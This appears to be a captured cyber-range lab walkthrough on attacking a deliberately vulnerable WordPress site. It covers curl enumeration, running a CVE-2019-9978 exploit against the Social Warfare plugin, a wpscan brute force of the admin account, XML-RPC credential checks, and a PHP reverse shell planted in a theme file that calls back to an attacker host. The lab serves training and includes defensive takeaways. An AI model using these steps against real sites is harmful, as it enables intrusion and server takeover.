@@ -1,0 +1,251 @@
+Timestamp: 2025-12-24T16:36:42.268610
+URL: https://app.cyberranges.com/instance/694bfa4cdabdba0ee85a71f7/overview
+Title: Scenario Overview | WordPress Hacking 101 - CYBER RANGES
+Hash: c0b8e527effb17ceadd2ab7afa248759fc5a3bbc76075d02710ccf26959dcf24
+================================================================================
+WordPress Hacking 101
+89 MIN
+0
+VPN
+CLOUD
+Overview
+Questions
+Servers
+Score
+Help
+Exit
+MISSION
+RULES
+WORDPRESS HACKING 101
+INTRODUCTION
+
+WordPress powers a large percentage of the web, making its specific misconfigurations and plugin vulnerabilities frequent attack vectors. Mastering the identification of these flaws is essential for comprehensive web asset assessment and defense.
+
+In this scenario, we will focus on how to attack the vulnerable WordPress site. We will start by gathering information, attacking users, plugins, and gaining a shell in the WordPress CMS.
+
+CMS stands for Content Management System, used on websites to allow users to create, manage, and modify digital content without requiring technical expertise. Popular CMS platforms are WordPress, Joomla, Drupal, Wix, and Shopify.
+
+	
+
+Key Point: WordPress is an easy-to-use website builder and content management system (CMS) that lets anyone create and manage a website.
+
+LAB ACCESS GUIDELINES
+
+To support the completion of this scenario, you are provided with a Kali VM that can be used for receiving reverse connections.
+
+Browser-based access is provided via the web service for GUI.
+
+VM
+
+	
+
+IP
+
+	
+
+Username
+
+	
+
+Password
+
+
+
+
+Kali
+
+	
+
+192.168.125.50
+
+	
+
+kali
+
+	
+
+password_CR1
+
+For VPN access steps see the Rules section.
+
+OBJECTIVE
+
+You'll use a Kali VM to access a vulnerable web application and see how it responds to our scanning and attack. By the end, you will have learned the basics of WordPress hacking from gathering information, attacking users, plugins and gaining a reverse shell. This gives you a practical look at how this CMS site can be attacked in a controlled setting.
+
+Basic Information about WordPress
+
+Successful enumeration requires a solid understanding of the standard WordPress directory structure. Identifying key configuration and core files is a prerequisite for distinguishing between normal deployments and vulnerable targets.
+
+Our target will be a modified vulnerable WordPress site from GitHub.
+
+Core Configuration & Auth
+
+wp-config.php: Contains the root password of the database.
+
+Login paths: /wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login
+
+xmlrpc.php: A script that provides an interface for remote connections to your WordPress site.
+
+Content & Themes
+
+wp-content/: Contains plugins and themes.
+
+wp-content/uploads/: Where uploaded files are stored.
+
+wp-includes/: Essential core files (fonts, javascript, certificates).
+
+index.php: A critical component of the theme structure.
+
+wp-sitemap.xml: Dynamic sitemap file.
+
+	
+
+Easy to Confuse: Login vs Admin
+
+While wp-login.php is the file that handles the authentication process, /wp-admin/ is the directory for the administrative dashboard. Attempting to access /wp-admin/ without a session usually redirects you to wp-login.php, but they are technically distinct endpoints.
+
+Target Access
+
+Login to the Kali attack machine using the provided credentials.
+
+The target IP http://192.168.125.40:31337 is a vulnerable WordPress site. Copy & paste it on the browser to begin our attack.
+
+Target IP: http://192.168.125.40:31337
+
+Manual Enumeration (cURL)
+
+We can use a scanner like wpscan to gain information about the WordPress site, or we can manually find the information by inspecting files like license.txt or readme.html.
+
+We will use the curl command below to find the WordPress version:
+
+curl http://192.168.125.40:31337 | grep 'content="WordPress'
+
+Additionally, we can use the curl command below to find the site's theme name:
+
+curl -s -X GET http://192.168.125.40:31337 | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+
+From the output above, we can clearly see that our site's theme name is Beauty-Premium.
+
+The curl command below can be used to extract information about plugins and their versions:
+
+curl -H 'Cache-Control: no-cache, no-store' -L -ik -s http://192.168.125.40:31337 | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+Exploitation (CVE-2019-9978)
+
+From the output above, we can see that we have some plugin names there. One of the plugins listed is Social Warfare which is running version 3.5.2.
+
+Version enumeration identifies 'Social Warfare 3.5.2'. Cross-referencing this version with vulnerability databases identifies CVE-2019-9978, a Remote Code Execution vulnerability.
+
+The python exploit code has been provided for you on the desktop directory with the name CVE-2019-9978.py.
+
+The command below will attempt to exploit the target plugin:
+
+python CVE-2019-9978.py -t http://192.168.125.40:31337/ -l 192.168.125.50 -p 80 -c "id"
+
+With the Remote Code Execution verified by the initial response, the attack vector is confirmed. The payload can now be modified to execute system-level commands, such as listing directories.
+
+python exploit.py -t http://192.168.125.40:31337/ -l 192.168.125.50 -p 80 -c "ls"
+
+	
+
+Reflection Point: Why is it critical to identify the specific version of the "Social Warfare" plugin before attempting exploitation?
+
+Model Answer: Exploits are highly specific. Identifying the exact version (3.5.2) allows us to search for matching vulnerabilities (CVE-2019-9978) in databases like Exploit-DB. Attacking a patched or non-vulnerable version would fail and potentially alert the defender.
+
+Brute Force Attack
+
+While RCE provides system access, administrative dashboard access offers further persistence and control. To achieve this, we leverage user enumeration data to launch a targeted brute-force attack against the admin account.
+
+The command below will allow us to brute-force the user admin using wpscan and the wordlist labeled password.txt which has been created and saved on the desktop.
+
+wpscan --url http://192.168.125.40:31337 -U admin --passwords passwords.txt
+
+The tool has successfully found the admin password.
+
+NOTE: In a real-world scenario, using a generic wordlist might take hours. Here, we use a curated list to focus on the mechanics of the attack rather than the wait time.
+
+Credential Verification (XMLRPC)
+
+The next phase is to verify the acquired credentials using Burp Suite. We will see the xmlrpc.php file by sending a POST request to the server. We will analyze the response to determine the validity of the credentials.
+
+Request Configuration
+
+Open Burp Suite and capture a simple GET request to the target.
+
+Change from GET to POST.
+
+Add the /xmlrpc.php path.
+
+Copy & paste this code in the body of the request:
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+Response Analysis
+
+Make the same POST request for it to get a 200 status. In the first example, we use wrong credentials (admin:Pass).
+
+We can see that the output states that the credentials are incorrect (Status 403/Fault).
+
+Let us try one more time with the credentials that we acquired from the wpscan result.
+
+The output above confirms that the credentials we acquired are correct i.e. Username: admin, Password: admin.
+
+	
+
+Reflection Point: We already had RCE on the server. Why did we also proceed to brute force the credentials and verify them via XMLRPC?
+
+Model Answer: The RCE exploit relies on a specific vulnerable plugin which could be patched or removed. Valid administrative credentials provide a more reliable and persistent form of access (via the dashboard) that isn't dependent on a single software flaw.
+
+Post-Exploitation (Reverse Shell)
+
+With valid administrative credentials secured, the next objective is to access the dashboard and leverage built-in functionality to upload a persistent shell.
+
+Use the URL below and the credentials admin: admin:
+
+http://192.168.125.40:31337/wp-login.php
+
+Having successfully logged in, we can manually gain a reverse shell by going to Appearance->Theme Editor (on the left tab). We will select theme: twenty twenty and then click the Select button.
+
+After WordPress loads the theme editor, navigate to the 404.php file and delete the existing php code.
+
+The php reverse shell code is already in the desktop directory with the name revshell.php. Copy the contents and paste it into the editor.
+
+	
+
+Easy to Confuse: LHOST vs RHOST
+
+In the reverse shell script, you must set the IP to your IP address (Kali: 192.168.125.50), not the target website's IP. This tells the server where to send the connection back to.
+
+Change the IP to our Kali IP: 192.168.125.50. You have the option of changing the port, but in the example below we will use the default configuration.
+
+Click the Update File button and wait for it to be uploaded.
+
+At this point, we should be able to trigger the PHP reverse shell that has been uploaded to wp-content/themes. Open the terminal and run the following command to start the listener:
+
+nc -lvp 1234
+
+You must start your Netcat listener (nc -lvp 1234) before navigating to the 404.php page in your browser. If the listener is not running when the server tries to connect, the shell connection will fail immediately.
+
+	
+
+Watch out for this: Listener First
+
+To trigger the reverse shell, open a new tab on the browser and navigate to the 404.php file that was modified.
+
+http://192.168.125.40:31337/wp-content/themes/twentytwenty/404.php
+
+We successfully managed to get a shell as www-data.
+
+CONCLUSION
+
+Congratulations. You have successfully demonstrated a multi-stage attack against a WordPress site. You began with reconnaissance to identify versions and vulnerable plugins, then executed a brute-force attack to gain administrative credentials. Finally, you leveraged that access to upload a malicious file and establish a reverse shell, achieving remote control over the server. This exercise highlights the real-world impact of chained vulnerabilities, where failures in plugin maintenance and password security combine to allow a full system compromise.
+
+	
+
+Reflection Point: Based on this exercise, what are two key steps you would take to secure this WordPress installation against these attacks?
+
+Model Answer: 1. Update all plugins (specifically Social Warfare) to the latest version to patch the RCE vulnerability. 2. Enforce strong, unique passwords for the admin account to prevent successful brute-force attacks.
